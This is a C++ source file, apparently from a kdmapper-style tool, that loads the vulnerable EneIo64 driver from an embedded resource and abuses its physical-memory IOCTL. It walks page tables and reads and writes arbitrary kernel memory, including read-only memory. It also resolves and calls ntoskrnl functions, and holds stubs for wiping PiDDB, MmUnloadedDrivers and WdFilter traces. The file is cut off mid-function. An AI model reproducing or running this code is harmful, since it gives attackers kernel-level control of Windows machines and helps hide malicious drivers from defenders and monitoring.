#include "eneio64_driver.hpp"
#include <Windows.h>
#include <string>
#include <fstream>
#include <filesystem>

#include "utils.hpp"
#include "eneio64_driver_resource.hpp"
#include "service.hpp"
#include "nt.hpp"

// 定义PAGE_SIZE常量
#ifndef PAGE_SIZE
#define PAGE_SIZE 0x1000
#endif

// 定义虚拟地址转物理地址相关常量
#define ENTRY_PRESENT_BIT       0x1
#define ENTRY_PAGE_SIZE_BIT     0x80
#define PHY_ADDRESS_MASK        0xffffffffff000ULL
#define PHY_ADDRESS_MASK_2MB_PAGES   0xfffffffffe00000ULL
#define PHY_ADDRESS_MASK_1GB_PAGES   0xffffffffc0000000ULL
#define VADDR_ADDRESS_MASK_4KB_PAGES 0xfff
#define VADDR_ADDRESS_MASK_2MB_PAGES 0x1fffff
#define VADDR_ADDRESS_MASK_1GB_PAGES 0x3fffffff

// 定义RtlOffsetToPointer宏
#ifndef RtlOffsetToPointer
#define RtlOffsetToPointer(Base, Offset)  ((PCHAR)( ((PCHAR)(Base)) + ((ULONG_PTR)(Offset))  ))
#endif

// 定义资源ID
#ifndef IDR_ENEIO64_DRIVER
#define IDR_ENEIO64_DRIVER 101
#endif

#ifdef PDB_OFFSETS
#include "KDSymbolsHandler.h"
#endif

// 添加FIELD_OFFSET宏定义，参考文档第645-648行
#ifndef FIELD_OFFSET
#define FIELD_OFFSET(type, field)    ((LONG)(LONG_PTR)&(((type *)0)->field))
#define UFIELD_OFFSET(type, field)    ((ULONG)(LONG_PTR)&(((type *)0)->field))
#endif

// 添加完整的结构体定义，严格按照参考文档第510-644行
#pragma pack(push,2)
typedef struct _FAR_JMP_16 {
    UCHAR  OpCode;  // = 0xe9
    USHORT Offset;
} FAR_JMP_16;

typedef struct _FAR_TARGET_32 {
    ULONG Offset;
    USHORT Selector;
} FAR_TARGET_32;

typedef struct _PSEUDO_DESCRIPTOR_32 {
    USHORT Limit;
    ULONG Base;
} PSEUDO_DESCRIPTOR_32;
#pragma pack(pop)

typedef union _KGDTENTRY64 {
    struct {
        USHORT  LimitLow;
        USHORT  BaseLow;
        union {
            struct {
                UCHAR   BaseMiddle;
                UCHAR   Flags1;
                UCHAR   Flags2;
                UCHAR   BaseHigh;
            } Bytes;
            struct {
                ULONG   BaseMiddle : 8;
                ULONG   Type : 5;
                ULONG   Dpl : 2;
                ULONG   Present : 1;
                ULONG   LimitHigh : 4;
                ULONG   System : 1;
                ULONG   LongMode : 1;
                ULONG   DefaultBig : 1;
                ULONG   Granularity : 1;
                ULONG   BaseHigh : 8;
            } Bits;
        };
        ULONG BaseUpper;
        ULONG MustBeZero;
    };
    ULONG64 Alignment;
} KGDTENTRY64, *PKGDTENTRY64;

typedef struct _KDESCRIPTOR {
    USHORT Pad[3];
    USHORT Limit;
    PVOID Base;
} KDESCRIPTOR, *PKDESCRIPTOR;

#define PSB_GDT32_MAX 3

typedef struct _KSPECIAL_REGISTERS {
    ULONG64 Cr0;
    ULONG64 Cr2;
    ULONG64 Cr3;
    ULONG64 Cr4;
    ULONG64 KernelDr0;
    ULONG64 KernelDr1;
    ULONG64 KernelDr2;
    ULONG64 KernelDr3;
    ULONG64 KernelDr6;
    ULONG64 KernelDr7;
    KDESCRIPTOR Gdtr;
    KDESCRIPTOR Idtr;
    USHORT Tr;
    USHORT Ldtr;
    ULONG MxCsr;
    ULONG64 DebugControl;
    ULONG64 LastBranchToRip;
    ULONG64 LastBranchFromRip;
    ULONG64 LastExceptionToRip;
    ULONG64 LastExceptionFromRip;
    ULONG64 Cr8;
    ULONG64 MsrGsBase;
    ULONG64 MsrGsSwap;
    ULONG64 MsrStar;
    ULONG64 MsrLStar;
    ULONG64 MsrCStar;
    ULONG64 MsrSyscallMask;
} KSPECIAL_REGISTERS, *PKSPECIAL_REGISTERS;

typedef struct _KPROCESSOR_STATE {
    KSPECIAL_REGISTERS SpecialRegisters;
    CONTEXT ContextFrame;
} KPROCESSOR_STATE, *PKPROCESSOR_STATE;

typedef struct _PROCESSOR_START_BLOCK* PPROCESSOR_START_BLOCK;
typedef struct _PROCESSOR_START_BLOCK {
    FAR_JMP_16 Jmp;
    ULONG CompletionFlag;
    PSEUDO_DESCRIPTOR_32 Gdt32;
    PSEUDO_DESCRIPTOR_32 Idt32;
    KGDTENTRY64 Gdt[PSB_GDT32_MAX + 1];
    ULONG64 TiledCr3;
    FAR_TARGET_32 PmTarget;
    FAR_TARGET_32 LmIdentityTarget;
    PVOID LmTarget;
    PPROCESSOR_START_BLOCK SelfMap;
    ULONG64 MsrPat;
    ULONG64 MsrEFER;
    KPROCESSOR_STATE ProcessorState;
} PROCESSOR_START_BLOCK;

namespace eneio64_driver
{
    // 定义全局变量：ntoskrnl.exe基地址
    ULONG64 ntoskrnlAddr = 0;

    // 超级调用驱动函数扩展版本
    NTSTATUS SuperCallDriverEx(
        _In_ HANDLE DeviceHandle,
        _In_ ULONG IoControlCode,
        _In_ PVOID InputBuffer,
        _In_ ULONG InputBufferLength,
        _In_opt_ PVOID OutputBuffer,
        _In_opt_ ULONG OutputBufferLength,
        _Out_opt_ PIO_STATUS_BLOCK IoStatus)
    {
        IO_STATUS_BLOCK ioStatus;
        NTSTATUS ntStatus = NtDeviceIoControlFile(DeviceHandle,
            NULL,
            NULL,
            NULL,
            &ioStatus,
            IoControlCode,
            InputBuffer,
            InputBufferLength,
            OutputBuffer,
            OutputBufferLength);
        if (ntStatus == STATUS_PENDING) {
            ntStatus = NtWaitForSingleObject(DeviceHandle,
                FALSE,
                NULL);
        }
        if (IoStatus)
            *IoStatus = ioStatus;
        return ntStatus;
    }

    // 超级调用驱动函数
    BOOL SuperCallDriver(
        _In_ HANDLE DeviceHandle,
        _In_ ULONG IoControlCode,
        _In_ PVOID InputBuffer,
        _In_ ULONG InputBufferLength,
        _In_opt_ PVOID OutputBuffer,
        _In_opt_ ULONG OutputBufferLength)
    {
        BOOL bResult;
        IO_STATUS_BLOCK ioStatus;
        
        // 仅在非常频繁的IOCTL调用时减少日志输出
        if (IoControlCode != IOCTL_ENEIO64_MAP_USER_PHYSICAL_MEMORY) {
            std::cout << "[DEBUG] SuperCallDriver: IOCTL=0x" << std::hex << IoControlCode
                      << ", InputSize=" << std::dec << InputBufferLength
                      << ", OutputSize=" << OutputBufferLength << std::endl;
        }
                  
        NTSTATUS ntStatus = SuperCallDriverEx(
            DeviceHandle,
            IoControlCode,
            InputBuffer,
            InputBufferLength,
            OutputBuffer,
            OutputBufferLength,
            &ioStatus);
            
        bResult = NT_SUCCESS(ntStatus);
        
        // 仅在非常频繁的IOCTL调用时减少日志输出
        if (IoControlCode != IOCTL_ENEIO64_MAP_USER_PHYSICAL_MEMORY) {
            std::cout << "[DEBUG] SuperCallDriver result: NTSTATUS=0x" << std::hex << ntStatus
                      << ", Success=" << (bResult ? "TRUE" : "FALSE") << std::endl;
        }
                  
        SetLastError(RtlNtStatusToDosError(ntStatus));
        return bResult;
    }

    // 映射物理内存到用户空间
    PVOID MapPhysicalMemory(
        _In_ HANDLE DeviceHandle,
        _In_ ULONG_PTR PhysicalAddress,
        _In_ ULONG NumberOfBytes,
        PVOID* Object,
        PHANDLE pHandle
    )
    {
        ULONG_PTR offset;
        ULONG mapSize;
        ENEIO64_PHYSICAL_MEMORY_INFO request;
        RtlSecureZeroMemory(&request, sizeof(request));
        
        // 根据参考文档第328-330行，正确的实现方式
        offset = PhysicalAddress & ~(PAGE_SIZE - 1);
        mapSize = (ULONG)(PhysicalAddress - offset) + NumberOfBytes;
        request.PhysicalAddress.QuadPart = PhysicalAddress;  // 关键修复：传入原始地址！
        request.Size.QuadPart = mapSize;
        request.pMappedAddress = NULL;
        request.pObject = NULL;
        request.hSection = NULL;
        
        // 移除重复的MapPhysicalMemory调试日志
        
        if (SuperCallDriver(DeviceHandle,
            IOCTL_ENEIO64_MAP_USER_PHYSICAL_MEMORY,
            &request,
            sizeof(request),
            &request,
            sizeof(request)))
        {
            if (Object)
            {
                *Object = request.pObject;
            }
            if (pHandle)
            {
                *pHandle = request.hSection;
            }
            return request.pMappedAddress;
        }
        return NULL;
    }

    // 取消映射物理内存
    void UnmapPhysicalMemory(HANDLE device_handle, PVOID mapped_address, PVOID object, HANDLE section)
    {
        ENEIO64_PHYSICAL_MEMORY_INFO request = { 0 };
        request.pMappedAddress = mapped_address;
        request.pObject = object;
        request.hSection = section;
        
        IO_STATUS_BLOCK ioStatus;
        SuperCallDriverEx(
            device_handle,
            IOCTL_ENEIO64_UNMAP_USER_PHYSICAL_MEMORY,
            &request,
            sizeof(request),
            &request,
            sizeof(request),
            &ioStatus
        );
    }

    // 读写物理内存的通用函数
    bool ReadWritePhysicalMemory(HANDLE device_handle, uint64_t physical_address, void* buffer, ULONG size, BOOLEAN write)
    {
        bool result = false;
        PVOID mapped_section = NULL;
        PVOID object = NULL;
        HANDLE section = NULL;
        
        // 映射物理内存段
        mapped_section = MapPhysicalMemory(device_handle, physical_address, size, &object, &section);
        
        if (mapped_section)
        {
            // 根据参考文档399、402、832、835行：EneIo64驱动内部已处理SectionOffset
            // 不需要再计算偏移，直接使用映射地址！
            
            // 移除重复的ReadWritePhysicalMemory调试日志
            
            __try
            {
                if (write)
                {
                    // 写入内存 - 直接使用映射地址，无需偏移计算
                    RtlCopyMemory(mapped_section, buffer, size);
                }
                else
                {
                    // 读取内存 - 直接使用映射地址，无需偏移计算
                    RtlCopyMemory(buffer, mapped_section, size);
                }
                result = true;
            }
            __except (EXCEPTION_EXECUTE_HANDLER)
            {
                result = false;
                std::cout << "[ERROR] Exception in ReadWritePhysicalMemory, code: 0x" << std::hex << GetExceptionCode() << std::endl;
            }
            
            // 取消映射物理内存段
            UnmapPhysicalMemory(device_handle, mapped_section, object, section);
        }
        else
        {
            std::cout << "[!] Failed to map physical memory at 0x" << std::hex << physical_address << std::endl;
        }
        
        return result;
    }

    // 检查驱动是否运行
    bool IsRunning()
    {
        HANDLE device_handle = CreateFileW(ENEIO64_DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (device_handle != INVALID_HANDLE_VALUE)
        {
            CloseHandle(device_handle);
            return true;
        }
        return false;
    }

    // 加载驱动
    HANDLE Load()
    {
        // 检查驱动是否已经运行
        if (IsRunning())
        {
            std::cout << "[+] EneIo64 driver is already running" << std::endl;
            HANDLE device_handle = CreateFileW(ENEIO64_DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
            if (device_handle != INVALID_HANDLE_VALUE)
            {
                ntoskrnlAddr = utils::GetKernelModuleAddress("ntoskrnl.exe");
                if (!ntoskrnlAddr)
                {
                    std::cout << "[-] Failed to get ntoskrnl.exe address" << std::endl;
                    CloseHandle(device_handle);
                    return INVALID_HANDLE_VALUE;
                }
                return device_handle;
            }
        }

        // 尝试从资源加载驱动
        std::cout << "[+] Loading EneIo64 driver from resource" << std::endl;
        
        // 获取临时文件路径
        std::wstring temp_directory = L"";
        std::wstring driver_path = L"";
        wchar_t temp_path[MAX_PATH];
        if (GetTempPathW(MAX_PATH, temp_path))
        {
            temp_directory = temp_path;
            driver_path = temp_directory + L"eneio64.sys";
        }
        else
        {
            std::cout << "[-] Failed to get temp directory" << std::endl;
            return INVALID_HANDLE_VALUE;
        }

        // 将驱动资源写入文件 - 从静态数组创建文件
        if (!utils::CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(eneio64_driver_resource::driver), sizeof(eneio64_driver_resource::driver)))
        {
            std::cout << "[-] Failed to create EneIo64 driver file" << std::endl;
            return INVALID_HANDLE_VALUE;
        }

        // 安装和启动服务
        if (!service::RegisterAndStart(driver_path, L"EneIo64"))
        {
            std::cout << "[-] Failed to register and start EneIo64 driver service" << std::endl;
            std::filesystem::remove(driver_path);
            return INVALID_HANDLE_VALUE;
        }

        // 删除驱动文件
        std::filesystem::remove(driver_path);

        // 尝试打开设备
        HANDLE device_handle = CreateFileW(ENEIO64_DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (device_handle == INVALID_HANDLE_VALUE)
        {
            std::cout << "[-] Failed to open EneIo64 device handle" << std::endl;
            return INVALID_HANDLE_VALUE;
        }

        // 获取ntoskrnl地址
        ntoskrnlAddr = utils::GetKernelModuleAddress("ntoskrnl.exe");
        if (!ntoskrnlAddr)
        {
            std::cout << "[-] Failed to get ntoskrnl.exe address" << std::endl;
            CloseHandle(device_handle);
            return INVALID_HANDLE_VALUE;
        }

        std::cout << "[+] EneIo64 driver loaded successfully" << std::endl;
        return device_handle;
    }

    // 卸载驱动
    bool Unload(HANDLE device_handle)
    {
        if (device_handle != INVALID_HANDLE_VALUE)
        {
            CloseHandle(device_handle);
        }

        // 停止服务
        return service::StopAndRemove(L"EneIo64");
    }

    // 读取内存
    bool ReadMemory(HANDLE device_handle, uint64_t address, void* buffer, uint64_t size)
    {
        uint64_t physical_address = 0;
        if (!GetPhysicalAddress(device_handle, address, &physical_address))
        {
            return false;
        }
        
        return ReadWritePhysicalMemory(device_handle, physical_address, buffer, (ULONG)size, FALSE);
    }

    // 写入内存
    bool WriteMemory(HANDLE device_handle, uint64_t address, void* buffer, uint64_t size)
    {
        uint64_t physical_address = 0;
        if (!GetPhysicalAddress(device_handle, address, &physical_address))
        {
            return false;
        }
        
        return ReadWritePhysicalMemory(device_handle, physical_address, buffer, (ULONG)size, TRUE);
    }

    // 写入只读内存
    bool WriteToReadOnlyMemory(HANDLE device_handle, uint64_t address, void* buffer, uint32_t size)
    {
        return WriteMemory(device_handle, address, buffer, size);
    }

    // 映射物理内存到用户空间
    PVOID MapPhysicalMemory(HANDLE device_handle, uint64_t physical_address, uint32_t size, PVOID* object, HANDLE* section)
    {
        ENEIO64_PHYSICAL_MEMORY_INFO request = { 0 };
        
        // 页面对齐 - 根据参考文档第330行修正
        uint64_t offset = physical_address & ~(PAGE_SIZE - 1);
        uint32_t map_size = static_cast<uint32_t>((physical_address - offset) + size);
        
        request.PhysicalAddress.QuadPart = physical_address;  // 关键修复：传入原始地址！
        request.Size.QuadPart = map_size;
        request.pMappedAddress = NULL;
        request.pObject = NULL;
        request.hSection = NULL;
        
        IO_STATUS_BLOCK ioStatus;
        NTSTATUS status = SuperCallDriverEx(
            device_handle,
            IOCTL_ENEIO64_MAP_USER_PHYSICAL_MEMORY,
            &request,
            sizeof(request),
            &request,
            sizeof(request),
            &ioStatus
        );
        
        if (NT_SUCCESS(status))
        {
            if (object)
                *object = request.pObject;
            if (section)
                *section = request.hSection;
            return request.pMappedAddress;
        }
        
        return NULL;
    }


    // 页表项转物理地址的辅助函数
    int PwEntryToPhyAddr(uint64_t entry, uint64_t* phyaddr)
    {
        if (entry & ENTRY_PRESENT_BIT) {
            *phyaddr = entry & PHY_ADDRESS_MASK;
            return 1;
        }
        return 0;
    }

    // 从单个页面缓冲区中获取PML4基址 - 完全按照参考文档第1056-1082行实现
    uint64_t GetPML4FromLowStub1M(uint64_t pbPageBuffer)
    {
        uint32_t offset = 0;  // 根据参考文档第1059行，从offset=0开始
        uint64_t PML4 = 0;
        
        // 根据参考文档第1061-1062行：使用FIELD_OFFSET宏计算CR3偏移
        uint32_t cr3_offset = FIELD_OFFSET(PROCESSOR_START_BLOCK, ProcessorState) +
                              FIELD_OFFSET(KSPECIAL_REGISTERS, Cr3);
        
        // 根据参考文档第1069行：使用FIELD_OFFSET宏计算LmTarget偏移
        uint32_t LmTarget_offset = FIELD_OFFSET(PROCESSOR_START_BLOCK, LmTarget);
        
        // 移除重复的调试输出 - 避免在循环中产生大量日志
        
        __try
        {
            // 根据参考文档第1067行：检查PROCESSOR_START_BLOCK->Jmp特征
            if (0x00000001000600E9 != (0xffffffffffff00ff & *(uint64_t*)(pbPageBuffer + offset)))
                return 0;
                
            // 根据参考文档第1069行：检查LmTarget特征
            if (0xfffff80000000000 != (0xfffff80000000003 & *(uint64_t*)(pbPageBuffer + offset + LmTarget_offset)))
                return 0;
                
            // 根据参考文档第1071行：检查CR3有效性
            if (0xffffff0000000fff & *(uint64_t*)(pbPageBuffer + offset + cr3_offset))
                return 0;
                
            // 根据参考文档第1073行：获取PML4值
            PML4 = *(uint64_t*)(pbPageBuffer + offset + cr3_offset);
            
            // 找到有效的PROCESSOR_START_BLOCK
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            std::cout << "[ERROR] Exception in GetPML4FromLowStub1M" << std::endl;
            return 0;
        }
        
        return PML4;
    }

    // 获取PML4值 - 根据参考文档第1015-1054行改进实现
    // 使用分页读取方式，避免一次性映射1M内存导致的异常
    bool QueryPML4Value(HANDLE device_handle, uint64_t* value)
    {
        *value = 0;
        uint64_t PML4 = 0;
        uint32_t page_size = 0x1000;
        
        // 计算关键偏移值已移至GetPML4FromLowStub1M函数中处理
        
        // 分配页面缓冲区
        void* page_buffer = malloc(page_size);
        if (!page_buffer) {
            std::cout << "[ERROR] Failed to allocate page buffer" << std::endl;
            return false;
        }
        
        // 优先检查常见的PROCESSOR_START_BLOCK位置
        uint64_t common_addresses[] = {
            0x1000, 0x2000, 0x4000, 0x5000, 0x6000, 0x7000, 0x8000, 0x9000,
            0xa000, 0xb000, 0xc000, 0xd000, 0xe000, 0xf000, 0x10000
        };
        
        // 先检查常见位置
        for (int i = 0; i < sizeof(common_addresses) / sizeof(common_addresses[0]); i++) {
            uint64_t address = common_addresses[i];
            
            // 清零缓冲区
            RtlZeroMemory(page_buffer, page_size);
            
            // 读取物理页面
            if (ReadWritePhysicalMemory(device_handle, address, page_buffer, page_size, FALSE)) {
                PML4 = GetPML4FromLowStub1M((uint64_t)page_buffer);
                if (PML4) {
                    *value = PML4;
                    // PML4找到，返回结果
                    free(page_buffer);
                    return true;
                }
            }
        }
        
        // 如果在常见位置未找到，则遍历整个低位内存，但限制最大扫描范围
        
        uint64_t address = 0;
        uint32_t max_pages = 64; // 限制最多扫描64个页面(256KB)
        uint32_t pages_scanned = 0;
        
        do {
            // 跳过0x3000地址和已检查的常见地址
            if (address == 0x3000) {
                address += page_size;
                continue;
            }
            
            // 检查是否已在常见地址中扫描过
            bool already_checked = false;
            for (int i = 0; i < sizeof(common_addresses) / sizeof(common_addresses[0]); i++) {
                if (address == common_addresses[i]) {
                    already_checked = true;
                    break;
                }
            }
            if (already_checked) {
                address += page_size;
                continue;
            }
            
            // 清零缓冲区
            RtlZeroMemory(page_buffer, page_size);
            
            // 读取物理页面
            if (ReadWritePhysicalMemory(device_handle, address, page_buffer, page_size, FALSE)) {
                PML4 = GetPML4FromLowStub1M((uint64_t)page_buffer);
                if (PML4) {
                    *value = PML4;
                    // PML4找到，返回结果
                    break;
                }
            }
            
            address += page_size;
            pages_scanned++;
        } while (address < 0x100000 && pages_scanned < max_pages);
        
        free(page_buffer);
        
        if (PML4 == 0) {
            std::cout << "[ERROR] Failed to find PML4 after scanning " << pages_scanned << " pages" << std::endl;
        }
        
        return (PML4 != 0);
    }

    // 虚拟地址转物理地址的核心算法 - 根据参考文档第748-799行实现
    bool VirtualToPhysical(HANDLE device_handle, uint64_t virtual_address, uint64_t* physical_address)
    {
        uint64_t pml4_cr3, selector, table, entry = 0;
        int r, shift;
        
        *physical_address = 0;
        
        // 开始页表遍历
        
        // 获取PML4基址
        if (!QueryPML4Value(device_handle, &pml4_cr3)) {
            std::cout << "[ERROR] Failed to get PML4 value" << std::endl;
            return false;
        }
        
        // 获取到PML4基址
        table = pml4_cr3 & PHY_ADDRESS_MASK;
        
        // 遍历4级页表：PML4 -> PDPT -> PD -> PT
        for (r = 0; r < 4; r++) {
            shift = 39 - (r * 9);
            selector = (virtual_address >> shift) & 0x1ff;
            
            // 遍历页表级别
            
            // 读取页表项
            if (!ReadWritePhysicalMemory(device_handle, table + selector * 8, &entry, sizeof(uint64_t), FALSE)) {
                std::cout << "[ERROR] Failed to read page table entry at level " << r << std::endl;
                return false;
            }
            
            // 读取页表项
            
            // 检查页表项是否有效
            if (!PwEntryToPhyAddr(entry, &table)) {
                std::cout << "[ERROR] Invalid page table entry at level " << r << std::endl;
                return false;
            }
            
            // 检查是否是大页面
            if (entry & ENTRY_PAGE_SIZE_BIT) {
                if (r == 1) {
                    // 1GB页面
                    table &= PHY_ADDRESS_MASK_1GB_PAGES;
                    table += virtual_address & VADDR_ADDRESS_MASK_1GB_PAGES;
                    *physical_address = table;
                    // 检测到1GB大页
                    return true;
                }
                if (r == 2) {
                    // 2MB页面
                    table &= PHY_ADDRESS_MASK_2MB_PAGES;
                    table += virtual_address & VADDR_ADDRESS_MASK_2MB_PAGES;
                    *physical_address = table;
                    // 检测到2MB大页
                    return true;
                }
            }
        }
        
        // 4KB页面
        table += virtual_address & VADDR_ADDRESS_MASK_4KB_PAGES;
        *physical_address = table;
        // 4KB标准页面
        return true;
    }

    // 获取物理地址（虚拟地址转物理地址）- 根据参考文档第800-810行实现
    bool GetPhysicalAddress(HANDLE device_handle, uint64_t virtual_address, uint64_t* out_physical_address)
    {
        if (!out_physical_address)
            return false;
        
        // 转换虚拟地址到物理地址
        
        // 使用完整的页表遍历算法，不再使用简化的内核地址转换
        // 这样确保所有地址都通过正确的物理地址转换
        return VirtualToPhysical(device_handle, virtual_address, out_physical_address);
    }

    // 分配独立页面
    uint64_t MmAllocateIndependentPagesEx(HANDLE device_handle, uint32_t size)
    {
        // TODO: 使用EneIo64驱动实现内存分配
        UNREFERENCED_PARAMETER(device_handle);
        UNREFERENCED_PARAMETER(size);
        return 0;
    }

    // 释放独立页面
    bool MmFreeIndependentPages(HANDLE device_handle, uint64_t address, uint32_t size)
    {
        // TODO: 使用EneIo64驱动实现内存释放
        UNREFERENCED_PARAMETER(device_handle);
        UNREFERENCED_PARAMETER(address);
        UNREFERENCED_PARAMETER(size);
        return false;
    }

    // 设置页面保护
    BOOLEAN MmSetPageProtection(HANDLE device_handle, uint64_t address, uint32_t size, ULONG new_protect)
    {
        // TODO: 使用EneIo64驱动实现页面保护设置
        UNREFERENCED_PARAMETER(device_handle);
        UNREFERENCED_PARAMETER(address);
        UNREFERENCED_PARAMETER(size);
        UNREFERENCED_PARAMETER(new_protect);
        return FALSE;
    }

    // 获取内核模块导出函数
    uint64_t GetKernelModuleExport(HANDLE device_handle, uint64_t kernel_module_base, const std::string& function_name)
    {
        if (!kernel_module_base)
            return 0;

        IMAGE_DOS_HEADER dos_header = { 0 };
        IMAGE_NT_HEADERS64 nt_headers = { 0 };

        if (!ReadMemory(device_handle, kernel_module_base, &dos_header, sizeof(dos_header)) || dos_header.e_magic != IMAGE_DOS_SIGNATURE ||
            !ReadMemory(device_handle, kernel_module_base + dos_header.e_lfanew, &nt_headers, sizeof(nt_headers)) || nt_headers.Signature != IMAGE_NT_SIGNATURE)
            return 0;

        const auto export_base = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        const auto export_base_size = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

        if (!export_base || !export_base_size)
            return 0;

        const auto export_data = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(VirtualAlloc(nullptr, export_base_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));

        if (!ReadMemory(device_handle, kernel_module_base + export_base, export_data, export_base_size))
        {
            VirtualFree(export_data, 0, MEM_RELEASE);
            return 0;
        }

        const auto delta = reinterpret_cast<uint64_t>(export_data) - export_base;

        const auto name_table = reinterpret_cast<uint32_t*>(export_data->AddressOfNames + delta);
        const auto ordinal_table = reinterpret_cast<uint16_t*>(export_data->AddressOfNameOrdinals + delta);
        const auto function_table = reinterpret_cast<uint32_t*>(export_data->AddressOfFunctions + delta);

        for (auto i = 0u; i < export_data->NumberOfNames; ++i) {
            const std::string current_function_name = std::string(reinterpret_cast<char*>(name_table[i] + delta));

            if (!_stricmp(current_function_name.c_str(), function_name.c_str())) {
                const auto function_ordinal = ordinal_table[i];
                if (function_table[function_ordinal] <= 0x1000) {
                    // 错误的函数地址?
                    return 0;
                }
                const auto function_address = kernel_module_base + function_table[function_ordinal];

                if (function_address >= kernel_module_base + export_base && function_address <= kernel_module_base + export_base + export_base_size) {
                    VirtualFree(export_data, 0, MEM_RELEASE);
                    return 0; // 64位系统上没有转发导出？
                }

                VirtualFree(export_data, 0, MEM_RELEASE);
                return function_address;
            }
        }

        VirtualFree(export_data, 0, MEM_RELEASE);
        return 0;
    }

    // 清理PiDDB缓存表
    bool ClearPiDDBCacheTable(HANDLE device_handle)
    {
        // TODO: 实现PiDDB缓存清理
        UNREFERENCED_PARAMETER(device_handle);
        return false;
    }

    // 清理MmUnloadedDrivers
    bool ClearMmUnloadedDrivers(HANDLE device_handle)
    {
        // TODO: 实现MmUnloadedDrivers清理
        UNREFERENCED_PARAMETER(device_handle);
        return false;
    }

    // 清理内核哈希桶列表
    bool ClearKernelHashBucketList(HANDLE device_handle)
    {
        // TODO: 实现内核哈希桶列表清理
        UNREFERENCED_PARAMETER(device_handle);
        return false;
    }

    // 清理WdFilter驱动列表
    bool ClearWdFilterDriverList(HANDLE device_handle)
    {
        // TODO: 实现WdFilter驱动列表清理
        UNREFERENCED_PARAMETER(device_handle);
        return false;
    }

    // 内存复制
    bool MemCopy(HANDLE device_handle, uint64_t destination, uint64_t source, uint64_t size)
    {
        // TODO: 实现内存复制
        UNREFERENCED_PARAMETER(device_handle);
        UNREFERENCED_PARAMETER(destination);
        UNREFERENCED_PARAMETER(source);
        UNREFERENCED_PARAMETER(size);
        return false;
    }

    // 设置内存
    bool SetMemory(HANDLE device_handle, uint64_t address, uint32_t value, uint64_t size)
    {
        // TODO: 实现内存设置
        UNREFERENCED_PARAMETER(device_handle);
        UNREFERENCED_PARAMETER(address);
        UNREFERENCED_PARAMETER(value);
        UNREFERENCED_PARAMETER(size);
        return false;
    }

    // 分配连续物理内存 - 根据参考文档第3.4节实现
    uint64_t MmAllocateContiguousMemory(HANDLE device_handle, SIZE_T NumberOfBytes)
    {
        if (!NumberOfBytes)
            return 0;

        static uint64_t kernel_MmAllocateContiguousMemory = GetKernelModuleExport(device_handle, ntoskrnlAddr, "MmAllocateContiguousMemory");

        if (!kernel_MmAllocateContiguousMemory) {
            std::cout << "[!] Failed to find MmAllocateContiguousMemory" << std::endl;
            return 0;
        }

        uint64_t pAddress = 0;

        if (!CallKernelFunction(device_handle, &pAddress, kernel_MmAllocateContiguousMemory, NumberOfBytes, MAXULONG64))
            return 0;

        return pAddress;
    }

    // 分配连续物理页面MDL - 根据参考文档第3.4节实现
    uint64_t MmAllocatePagesForMdlEx(HANDLE device_handle, LARGE_INTEGER LowAddress, LARGE_INTEGER HighAddress, LARGE_INTEGER SkipBytes, SIZE_T TotalBytes, nt::MEMORY_CACHING_TYPE CacheType, nt::MEMORY_ALLOCATE_FLAG Flags)
    {
        static uint64_t kernel_MmAllocatePagesForMdlEx = GetKernelModuleExport(device_handle, ntoskrnlAddr, "MmAllocatePagesForMdlEx");
        if (!kernel_MmAllocatePagesForMdlEx)
        {
            std::cout << "[!] Failed to find MmAllocatePagesForMdlEx" << std::endl;
            return 0;
        }

        uint64_t allocated_pages = 0;

        if (!CallKernelFunction(device_handle, &allocated_pages, kernel_MmAllocatePagesForMdlEx, LowAddress, HighAddress, SkipBytes, TotalBytes, CacheType, Flags))
        {
            std::cout << "[!] Failed to CallKernelFunction MmAllocatePagesForMdlEx" << std::endl;
            return 0;
        }

        return allocated_pages;
    }

    // MDL相关函数声明
    uint64_t MmMapLockedPagesSpecifyCache(HANDLE device_handle, uint64_t mdl, nt::KPROCESSOR_MODE AccessMode, nt::MEMORY_CACHING_TYPE CacheType, PVOID RequestedAddress, BOOLEAN BugCheckOnFailure, nt::MM_PAGE_PRIORITY Priority)
    {
        static uint64_t kernel_MmMapLockedPagesSpecifyCache = GetKernelModuleExport(device_handle, ntoskrnlAddr, "MmMapLockedPagesSpecifyCache");
        if (!kernel_MmMapLockedPagesSpecifyCache)
        {
            std::cout << "[!] Failed to find MmMapLockedPagesSpecifyCache" << std::endl;
            return 0;
        }

        uint64_t mapped_address = 0;
        if (!CallKernelFunction(device_handle, &mapped_address, kernel_MmMapLockedPagesSpecifyCache, mdl, AccessMode, CacheType, RequestedAddress, BugCheckOnFailure, Priority))
        {
            std::cout << "[!] Failed to CallKernelFunction MmMapLockedPagesSpecifyCache" << std::endl;
            return 0;
        }

        return mapped_address;
    }

    bool MmProtectMdlSystemAddress(HANDLE device_handle, uint64_t mdl, ULONG new_protect)
    {
        static uint64_t kernel_MmProtectMdlSystemAddress = GetKernelModuleExport(device_handle, ntoskrnlAddr, "MmProtectMdlSystemAddress");
        if (!kernel_MmProtectMdlSystemAddress)
        {
            std::cout << "[!] Failed to find MmProtectMdlSystemAddress" << std::endl;
            return false;
        }

        NTSTATUS result = 0;
        if (!CallKernelFunction(device_handle, &result, kernel_MmProtectMdlSystemAddress, mdl, new_protect))
        {
            std::cout << "[!] Failed to CallKernelFunction MmProtectMdlSystemAddress" << std::endl;
            return false;
        }

        return NT_SUCCESS(result);
    }

    void MmUnmapLockedPages(HANDLE device_handle, uint64_t BaseAddress, uint64_t mdl)
    {
        static uint64_t kernel_MmUnmapLockedPages = GetKernelModuleExport(device_handle, ntoskrnlAddr, "MmUnmapLockedPages");
        if (!kernel_MmUnmapLockedPages)
        {
            std::cout << "[!] Failed to find MmUnmapLockedPages" << std::endl;
            return;
        }

        CallKernelFunction<void>(device_handle, nullptr, kernel_MmUnmapLockedPages, BaseAddress, mdl);
    }

    void MmFreePagesFromMdl(HANDLE device_handle, uint64_t mdl)
    {
